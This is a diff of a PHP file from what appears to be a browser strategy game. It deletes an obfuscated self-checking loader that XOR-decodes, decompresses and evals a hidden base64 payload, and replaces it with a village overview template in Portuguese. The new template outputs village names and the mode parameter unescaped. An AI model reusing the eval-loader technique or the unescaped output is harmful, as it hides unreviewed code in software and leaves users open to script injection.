@@ -1,24 +1,90 @@
 <?php
-$svjcdgvy="9d18de4ee6fef5f40c8e70b9c9dd1069";
-$awzrulh="0c520209550751555704510000035f5609515b060454065f530d5d005407550a";
-$vrgwduq="TezeZvzstngijHCvXSIv6V50r3ujklZ9C64yJj+G0zuNlmZlgFkUu0SF3gtBDSgN+jOSf8AGP4vovQTV+DY1GJiWHEDbxY7b2J2dia8CdpHIGltYKOuEam6YoToUgeWEaT5vA3JtCW2YrJYpYj+LIGGsaGWqLvzftGiSgETzSahG/9uYob7/t/JeS4SatMgKI78kgOJAGXSN0d+C9rVG4B0QMjh756AJXyU8UUDCb75BgoXqfieLl5NzhhwBNNcVY2F81A5lfiZ4Abs2Xo8W2kVdY27v8/xXOBcRIVawkscnkD7mjFk6oJWBt1V6gOZgcVjv5TpyP/AEtUO1YTj+2aBchTmMRwSLkvrksFCN2AZzs8hc3Bj6nk9l0WND4e/6ZWNEAJpuqTO1XNzWZX3PduC7qeB8xy3mbdQ6/xHR4zr2zPzKzl37fMrQgLOfQLPoBElOjtFcIlm+pNcNy4BvDpG93FneVc1CBSQoVx8dcMESo1PtJ1+JNo5g6062lB/213Sob8T3q0BBwRKONwn8b9zQFYMZceOTQrtc3dgJylzgqsVn5txdW+mACTJaH/IRrJKmvWG31IO+B0ODgp9U5PPUf8FJUSJ3EcKcKQ2Dp68ELU04IUCtUrqOIF9cFyh4vvVH73OIREN35P2tF4ANibbUtSrgg4u00VdqEDi9LdLCkAMXezKmpYRmQfIjeVBWyuIp0NG2/gyPdZblia5/VmgzWJQjqG3/pFJDeRz3awGnwFuDt7pgKE2l8sFioTjyd9kKYzwKkTC3Pwpq5J58YQRBfXYNc4PICLhs9mg3SsYYEmRL+KdloODRLPUWm91iKZUNgkuu0DDNBKWZFCM8cjQMpBeb2ViZ9pTJFEyCOK/qIG1nHsRvsukpj9iwQ+WowIciR+kHEnNuO6DJts3s6cdSUU4BwGDd3n+4ODxeL8OXXZdFBKc+I5QDCxOG7LrBR2GZrLUjE+HvuS8CWyO/U+rOS5xkHMXMCyxJpZdmbpNOPuQY1IOU/OGZ6gm89SMdBVCaE8cIZtfVcZmeMYaDN1zuMdQaXba3YNM8c2ygKNnb+MORmrDFYdwITbt0iRslfvyY5Y3jmuvD+mgP6ej4iCmPhRx+X6kehZiDmT+Wjy5FbTXdhu17CZO5T/0i+DaR9RnaaExFnbCu6CstkbPwUcNwruvNLAJ0sW5T5edYk9UGn5qI1pnI2/rNN2r+4PM=";
-$dsocti=file_get_contents(__FILE__);
-$krccdywk=str_replace($vrgwduq,"",$dsocti);
-if(strpos($krccdywk,"ec"."ho")!==false||strpos($krccdywk,"pr"."int")!==false||strpos($krccdywk,"var_"."dump")!==false||strpos($krccdywk,"file_put_"."contents")!==false||strpos($krccdywk,"fw"."rite")!==false){die();}
-$cdesrdhb=str_replace(array($svjcdgvy,$awzrulh),array("SP_890fa4ea","KP_2b94ecbc"),$dsocti);
-$ykhmbic=md5($cdesrdhb);
-$pusuznbsk=hex2bin($awzrulh);
-$kqobug="";
-$bnusjidcc=strlen($ykhmbic);
-for($fmdbouxq=0;$fmdbouxq<$bnusjidcc;$fmdbouxq++){
-$kqobug.=chr(ord($pusuznbsk[$fmdbouxq])^ord($ykhmbic[$fmdbouxq]));
-}
-$psmhvbgmx=base64_decode($vrgwduq);
-$nsqmtexzij=strlen($psmhvbgmx);
-$hxwpduun="";
-$jdrwvnudt=strlen($kqobug);
-for($fmdbouxq=0;$fmdbouxq<$nsqmtexzij;$fmdbouxq++){
-$hxwpduun.=$psmhvbgmx[$fmdbouxq]^$kqobug[$fmdbouxq%$jdrwvnudt];
-}
-$pbufkbh="gzun"."compress";
-eval('?>' . $pbufkbh($hxwpduun) . '<?php ');
+/**
+ * Overview Villages View
+ * Handles multiple modes: prod, combined, units, etc.
+ */
+?>
+
+<h2>Visão geral</h2>
+
+<table class="vis" width="100%">
+    <tr>
+        <?php foreach ($links as $name => $link_mode): ?>
+            <?php if ($mode == $link_mode): ?>
+                <td class="selected" width="100"><a
+                        href="game.php?village=<?= $village['id'] ?>&screen=overview_villages&mode=<?= $link_mode ?>"><?= $name ?></a>
+                </td>
+            <?php else: ?>
+                <td width="100"><a
+                        href="game.php?village=<?= $village['id'] ?>&screen=overview_villages&mode=<?= $link_mode ?>"><?= $name ?></a>
+                </td>
+            <?php endif; ?>
+        <?php endforeach; ?>
+    </tr>
+</table>
+<br>
+
+<?php if ($mode == 'prod'): ?>
+    <table class="vis" width="100%">
+        <tr>
+            <th>Aldeia</th>
+            <th>Pontos</th>
+            <th>Recursos</th>
+            <th>Armazém</th>
+            <th>Fazenda</th>
+        </tr>
+        <?php if (!empty($villages)): ?>
+            <?php foreach ($villages as $vid => $vdata): ?>
+                <tr <?= $vdata['parzysta_liczba'] ? 'class="row_b"' : 'class="row_a"' ?>>
+                    <td>
+                        <a href="game.php?village=<?= $vdata['id'] ?>&screen=overview"><?= $vdata['name'] ?>
+                            (<?= $vdata['x'] ?>|<?= $vdata['y'] ?>) K<?= $vdata['continent'] ?></a>
+                    </td>
+                    <td><?= $vdata['points'] ?></td>
+                    <td>
+                        <span class="wood"><img src="/graphic/icons/wood.png" title="Madeira" alt="" /> <?= $vdata['r_wood'] ?></span>
+                        <span class="stone"><img src="/graphic/icons/stone.png" title="Argila" alt="" /> <?= $vdata['r_stone'] ?></span>
+                        <span class="iron"><img src="/graphic/icons/iron.png" title="Ferro" alt="" /> <?= $vdata['r_iron'] ?></span>
+                    </td>
+                    <td><?= $vdata['storage'] ?? '?' ?></td>
+                    <td><?= $vdata['r_bh'] ?> / <?= $vdata['farm'] ?? '?' ?></td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td colspan="5">Nenhuma aldeia encontrada.</td>
+            </tr>
+        <?php endif; ?>
+    </table>
+<?php elseif ($mode == 'combined'): ?>
+    <table class="vis" width="100%">
+        <tr>
+            <th>Aldeia</th>
+            <th>Fazenda</th>
+            <th>Pesquisas</th>
+            <th>Tropas</th>
+        </tr>
+        <?php if (!empty($villages)): ?>
+            <?php foreach ($villages as $vid => $vdata): ?>
+                <tr <?= $vdata['parzysta_liczba'] ? 'class="row_b"' : 'class="row_a"' ?>>
+                    <td>
+                        <a href="game.php?village=<?= $vdata['id'] ?>&screen=overview"><?= $vdata['name'] ?>
+                            (<?= $vdata['x'] ?>|<?= $vdata['y'] ?>) K<?= $vdata['continent'] ?></a>
+                    </td>
+                    <td><?= $vdata['farm'] ?></td>
+                    <td>
+                        <!-- Tech status placeholders -->
+                        <?php if ($vdata['smith']): ?><img src="/graphic/buildings/smith.png" title="Ferreiro"><?php endif; ?>
+                    </td>
+                    <td>
+                        <!-- Unit status placeholders -->
+                        <?php if ($vdata['barracks']): ?><img src="/graphic/buildings/barracks.png"
+                                title="Quartel"><?php endif; ?>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php endif; ?>
+    </table>
+<?php else: ?>
+    <p>Modo '<?= $mode ?>' ainda não implementado na visualização.</p>
+<?php endif; ?>
